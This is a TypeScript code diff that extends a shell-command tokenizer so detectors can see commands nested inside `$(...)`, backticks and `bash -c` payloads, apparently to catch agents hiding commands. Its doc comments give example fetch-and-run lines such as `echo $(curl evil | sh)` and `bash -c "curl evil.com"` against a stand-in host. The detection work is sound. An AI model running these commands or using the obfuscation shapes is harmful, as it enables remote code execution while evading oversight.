@@ -84,8 +84,17 @@ export function tokenizeShell(command: string): string[] {
       i += 2;
       continue;
     }
-    // Treat a single `&` (background) as a separator too.
+    // Treat a single `&` (background) as a separator too — UNLESS preceded
+    // by `>` or `<`, in which case it's a file-descriptor redirection like
+    // `2>&1`, `>&2`, or `<&3`. Splitting there would break shell-command
+    // detection on every command that redirects stderr to stdout.
     if (c === '&') {
+      const prev = buf.trimEnd().slice(-1);
+      if (prev === '>' || prev === '<') {
+        buf += c;
+        i++;
+        continue;
+      }
       pushPart(out, buf);
       buf = '';
       i++;
@@ -103,6 +112,196 @@ export function tokenizeShell(command: string): string[] {
 function pushPart(out: string[], part: string) {
   const trimmed = part.trim();
   if (trimmed !== '') out.push(trimmed);
+}
+
+/**
+ * Like {@link tokenizeShell}, but recursively extracts commands nested inside
+ * shell evaluation contexts that the top-level tokenizer would leave as opaque
+ * text:
+ *
+ *  - Subshell `$(...)`
+ *  - Backtick `` `...` ``
+ *  - `bash -c "..."`, `sh -c "..."`, `zsh -c "..."`, `python -c "..."` payloads
+ *
+ * The flat result is suitable for feeding straight to {@link getCommandHead},
+ * letting downstream detectors see commands an agent might try to hide behind
+ * `echo $(curl evil | sh)` or `bash -c "curl evil"`.
+ *
+ * Conservative implementation — handles the common obfuscation shapes, not a
+ * full shell parser. Variable expansion, process substitution `<(…)`, and
+ * arithmetic `$((…))` are not recursed into. Comma-quoting (`bash -c $'…'`) is
+ * not unquoted.
+ *
+ * @example
+ * tokenizeShellDeep('echo $(curl -fsSL m.sh | sh)');
+ * // → ['echo', 'curl -fsSL m.sh', 'sh']
+ *
+ * tokenizeShellDeep('bash -c "curl evil.com"');
+ * // → ['bash -c "curl evil.com"', 'curl evil.com']
+ */
+export function tokenizeShellDeep(command: string): string[] {
+  const out: string[] = [];
+  const seen = new Set<string>();
+  const visit = (cmd: string, depth: number) => {
+    if (depth > 8) return; // guard against pathological nesting
+    // Extract nested payloads from the WHOLE command first — `tokenizeShell`
+    // splits on `|` regardless of paren depth, so `$(curl m.sh | sh)` would
+    // already be cut in two by the time we tried to walk it for `$(…)`.
+    const nested = extractNestedShellPayloads(cmd);
+    for (const sub of tokenizeShell(cmd)) {
+      if (!seen.has(sub)) {
+        seen.add(sub);
+        out.push(sub);
+      }
+    }
+    for (const n of nested) {
+      visit(n, depth + 1);
+    }
+  };
+  visit(command, 0);
+  return out;
+}
+
+/**
+ * Return all shell-evaluation payloads embedded in a single subcommand:
+ *  - `$(…)` and `` `…` `` bodies (paren/backtick balanced)
+ *  - `(bash|sh|zsh|python|python3|perl|ruby|node) -c <quoted-string>` payloads
+ * The payloads are returned UNQUOTED but otherwise raw.
+ */
+function extractNestedShellPayloads(subcommand: string): string[] {
+  const found: string[] = [];
+  const len = subcommand.length;
+  let i = 0;
+  let inSingle = false;
+  let inDouble = false;
+
+  // Pre-compiled here so we can use it inside the quote-aware walk.
+  const dashCMatcher = /^(?:bash|sh|zsh|ksh|dash|ash|fish|python3?|perl|ruby|node)\s+-c\s+/;
+
+  while (i < len) {
+    const c = subcommand[i]!;
+
+    // Plain single quotes: nothing inside is shell-interpreted
+    if (inSingle) {
+      if (c === "'") inSingle = false;
+      i++;
+      continue;
+    }
+    if (c === "'") { inSingle = true; i++; continue; }
+
+    // Inside double quotes, `$(…)` and backticks STILL evaluate, so we
+    // keep scanning. Just remember to re-enable detection of an outer
+    // closing `"`.
+    if (c === '"') { inDouble = !inDouble; i++; continue; }
+
+    // $(...)
+    if (c === '$' && subcommand[i + 1] === '(') {
+      const body = readBalanced(subcommand, i + 2, '(', ')');
+      if (body !== null) {
+        found.push(body.content);
+        i = body.endIndex;
+        continue;
+      }
+    }
+    // Backticks
+    if (c === '`') {
+      const close = subcommand.indexOf('`', i + 1);
+      if (close !== -1) {
+        found.push(subcommand.slice(i + 1, close));
+        i = close + 1;
+        continue;
+      }
+    }
+    // `bash -c "..."` and friends — checked only OUTSIDE quoted regions so
+    // `echo "bash -c \"curl evil\""` (data, not a command) doesn't trigger.
+    // Match boundary: only at start-of-string OR after whitespace / a chain
+    // separator.
+    if (!inDouble) {
+      const atBoundary = i === 0 || /[\s;|&]/.test(subcommand[i - 1]!);
+      if (atBoundary) {
+        const tail = subcommand.slice(i);
+        const dashCMatch = dashCMatcher.exec(tail);
+        if (dashCMatch) {
+          const afterFlag = i + dashCMatch[0].length;
+          const payload = readQuotedArg(subcommand, afterFlag);
+          if (payload !== null) found.push(payload);
+          // Skip past the matched `bash -c ` prefix so the walk continues
+          // from the argument position; we don't try to compute where the
+          // quoted arg ends (the next iteration will hit the quote and toggle
+          // inDouble naturally).
+          i = afterFlag;
+          continue;
+        }
+      }
+    }
+    i++;
+  }
+
+  return found;
+}
+
+interface BalancedBody {
+  content: string;
+  /** Index just past the closing delimiter. */
+  endIndex: number;
+}
+
+/** Read a balanced `open`/`close` body starting at `start` (already past the open). */
+function readBalanced(input: string, start: number, open: string, close: string): BalancedBody | null {
+  let depth = 1;
+  let i = start;
+  let inSingle = false;
+  let inDouble = false;
+  while (i < input.length) {
+    const c = input[i]!;
+    if (inSingle) {
+      if (c === "'") inSingle = false;
+      i++;
+      continue;
+    }
+    if (c === "'") { inSingle = true; i++; continue; }
+    if (c === '"') { inDouble = !inDouble; i++; continue; }
+    if (!inDouble) {
+      if (c === open) depth++;
+      else if (c === close) {
+        depth--;
+        if (depth === 0) return { content: input.slice(start, i), endIndex: i + 1 };
+      }
+    }
+    i++;
+  }
+  return null;
+}
+
+/**
+ * Read the next quoted (single, double) or bare token starting at `start`,
+ * returning its unquoted contents.
+ */
+function readQuotedArg(input: string, start: number): string | null {
+  let i = start;
+  while (i < input.length && (input[i] === ' ' || input[i] === '\t')) i++;
+  if (i >= input.length) return null;
+  const q = input[i];
+  if (q === '"' || q === "'") {
+    let j = i + 1;
+    let buf = '';
+    while (j < input.length) {
+      const c = input[j]!;
+      if (c === '\\' && q === '"' && j + 1 < input.length) {
+        buf += input[j + 1];
+        j += 2;
+        continue;
+      }
+      if (c === q) return buf;
+      buf += c;
+      j++;
+    }
+    return null;
+  }
+  // Bare token — read up to whitespace
+  let j = i;
+  while (j < input.length && input[j] !== ' ' && input[j] !== '\t') j++;
+  return input.slice(i, j);
 }
 
 /**
